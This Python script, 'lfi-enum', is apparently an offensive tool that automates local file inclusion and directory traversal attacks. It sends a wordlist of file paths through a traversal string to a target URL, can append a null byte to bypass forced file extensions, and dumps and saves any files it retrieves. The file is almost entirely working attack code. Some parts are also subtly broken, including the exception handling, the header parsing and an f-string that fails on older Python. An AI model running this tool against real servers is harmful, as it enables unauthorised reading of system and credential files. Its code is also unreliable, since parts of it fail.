#!/usr/bin/env python3

# Ideas listed on  https://highon.coffee/blog/lfi-cheat-sheet/
# LFI Payloads: https://github.com/tennc/fuzzdb/tree/master/dict/BURP-PayLoad/LFI
# TODO: Automatically detect if a null byte needs to be added


import requests,sys,argparse,os,time
from urllib.parse import quote
from pathlib import Path

version="0.2"

debug=False
verbose=False
dprint=None
vprint=None


def printBanner():
	print(f"lfi-enum {version}")


def loadWordlist(wordlistfile):
	print(f"Loading wordlist from {wordlistfile}...")
	wordlist=[]
	try:
		with open(wordlistfile,"r") as file:
			for line in file:
				if line.strip():		# skip blank lines, and remove whitespace
					wordlist.append(line.strip())

	except Exception as e:
		print(f"Cannot open specified wordlist file: {wordlistfile}")
		print(str(e))
		exit()
	
	print(f"Loaded {len(wordlist)} paths to check.")
	dprint(f"DEBUG: Loaded wordlist: {wordlist}")
	return wordlist



def createDir(directory):
	newdir=Path(os.getcwd(),directory)  
	print(f"Creating {newdir}")

	try:
		os.makedirs(newdir,0o775,True)
	except FileExistsError:
		print("{newdir} already exists.")
		pass
	except OSError as e:
		raise e
	finally:
		return newdir



def writeFile(filename,content,directory):

	# First crunch the path/filename from target to a flat file name
	tmpfile=filename

	# Handle Unix paths
	# If unix path starts with leading /, delete it
	if tmpfile.startswith('/'):
		tmpfile=tmpfile.replace('/','',1)

	# replace the others with an underscore
	tmpfile=tmpfile.replace('/','_')
	
	# handle Windows paths
	tmpfile=tmpfile.replace(':','')
	tmpfile=tmpfile.replace('\\','_')

	# Build the full file path
	d=Path(directory)
	f=d/tmpfile        # ok this is pathlib syntactic sugar that combines two path objects

	# Then open the file and write it.
	f=str(f).rstrip()

	if len(content)>0:
		print(f"Writing file {f}")
		try:
			fh = open(f,"w")
			fh.write(content)
			fh.close()
		except OSError as e:
			raise


def splitWordList(wordlist):
	relative=[]
	absolute=[]

	for line in wordlist:

		if line[0] =="/":
			absolute.append(line)
		else:
			relative.append(line)


	dprint(f"DEBUG: relative length: {len(relative)}")
	dprint(f"DEBUG: absolute length: {len(absolute)}")

	#dprint(f"DEBUG: Absolute list: {absolute}")
	#dprint(f"DEBUG: Relative list: {relative}")

	return(relative,absolute)


def testLFI(url,traversalString,wordlist,directory=None,null=False,headers=None):
# The meat of the program. iterate through word list and request each file. Write files out if requested
	print("------------------------------------------------------------------------")


	sess=requests.Session()
	sess.headers.update(headers)

	relative,absolute=splitWordList(wordlist)

	#exit()

	# First lets check current directory for relative paths

	for line in wordlist:
		# Absolute paths need traversal string to get to root
		# Relative paths (without a / prefix on the line) can go from cwd

		# Ignore comments
		if line[0] =="#":
			continue
		if line[0]=="/":
			testUrl=url+traversalString+line
		else:
			testUrl=url+line

		# If user flags for null byte. 
		if null:
			vprint("Appending null byte")
			testUrl+="\x00"

		vprint(f"Requesting {testUrl}")
		
		try:
			r=sess.get(testUrl,allow_redirects=True)
		except Exception as e:
			raise e
		#dprint(f"DEBUG: Response: {url}, Status: {r.status_code}, Length {r.headers['content-length']}")
		dprint(f"DEBUG: Response Headers: {r.headers}")

		# Detect, alert and exit on HTTP redirection
		if r.status_code>300 and r.status_code <=399:
			print(f"WARNING: Redirected to {r.headers["location"]}")
			print("Run again and enable following redirection")
			exit()

		if r.status_code==200:
			if int(r.headers["Content-Length"])==0:
				print(f"{line}: No content")
				print("------------------------------------------------------------------------")
			else:
				print(f"Success: \t{testUrl}")
				print(r.text)
				# If we were passed a directory, write the response body in there.
				if directory!=None:
					writeFile(line,r.text,directory)
				print("------------------------------------------------------------------------")
		else:
			vprint(f"{r.status_code} Error requesting {testUrl}")




def parseArgs(argv):
	parser = argparse.ArgumentParser( 
	                                description = "Automates directory traversal and LFI checks. Wordlists consist of filenames prefixed with './' to check relative to cwd, or absolute paths",
	                                )

	parser.add_argument(
	                      "url",
	                      help = "Base URL to directory traversal vulnerability.  e.g http://hostname/path?arg="
	                      )


	parser.add_argument(
						  "-t",
						  "--traversalString",
						  help="The string required to reach the root directory, e.g. ../../../..",
						  action="store",
						  required=True
						  )
	parser.add_argument(
						  "-w",
	                      "--wordlist",
	                      action="store",
	                      help="Specify an LFI wordlist. Wordlists are expected to be absolute paths on target system, or relative to the cwd",
						  required=True
						  )

	parser.add_argument(
	                      "-H",
	                      "--header",
	                      help="add a custom header",
	                      type=str,
	                      action="store"
	                      )


	parser.add_argument(
	                      "-v",
	                      "--verbose",
	                      help="increase output verbosity",
	                      action="store_true"
	                      )
	parser.add_argument(
	                      "-d",
	                      "--debug",
	                      help="debug output",
	                      action="store_true"
	                      )

	parser.add_argument(
						  "-o",
						  "--outdir",
						  help="Specify a directory relative to the current directory to save files. Filenames will be flattened in here"
						  )
	parser.add_argument(
						  "-n",
						  "--nullbyte",
						  help="Appends a null byte (0x00) to each request. This may allow requests to web apps that automatically append a file extension.",
						  action="store_true"
						  )

#	parser.add_argument(
#						  "-r",
#						  "--remote",
#						  help="TODO: Not Implimented. Starts a simple webserver and attempts a remote file inclusion ")


	return parser.parse_args()



def main():

	args=parseArgs(sys.argv)
	
	global debug
	global verbose
	debug = args.debug
	verbose=args.verbose

	# Define a verbose printing mechanism
	global vprint
	vprint = print if args.verbose else lambda *a, **k: None

	#define a seperate debug print
	global dprint
	dprint = print if args.debug else lambda *a, **k: None

	printBanner()





	# Build out the base URL from commandline arguments to test against
	
	url=args.url
	traversalString=args.traversalString
	outdir=args.outdir

#	path=url+traversalString


	# Load wordlist from file.
	wordlistfile=args.wordlist
	wordlist=loadWordlist(wordlistfile)

	# Create Output Directory if required
	if outdir!=None:
		print(f"Output directory: {outdir}")
		fulldir=createDir(outdir)
	else:
		fulldir=None

#	exit()		# Exit for now

	# make headers
	headerlist=args.header.split(":",maxsplit=1)
	headers={headerlist[0].lstrip():headerlist[1].lstrip()}
	vprint(headers)

	testLFI(url,traversalString,wordlist,fulldir,args.nullbyte,headers)






if __name__== '__main__':
	try:
		main()
	except KeyboardInterrupt or OSError:
			print("ctrl-c detected. quitting")
			exit(1)



